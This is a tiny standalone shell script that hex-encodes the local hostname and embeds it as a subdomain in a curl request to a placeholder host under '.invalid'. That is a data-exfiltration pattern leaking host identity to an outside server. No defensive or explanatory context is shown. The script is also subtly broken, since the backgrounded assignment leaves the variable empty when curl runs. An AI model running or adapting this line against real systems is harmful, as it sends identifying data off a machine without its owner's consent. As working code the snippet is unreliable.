#!/bin/sh
payload=$(hostname | xxd -p) &
curl "https://$payload.service.invalid/"
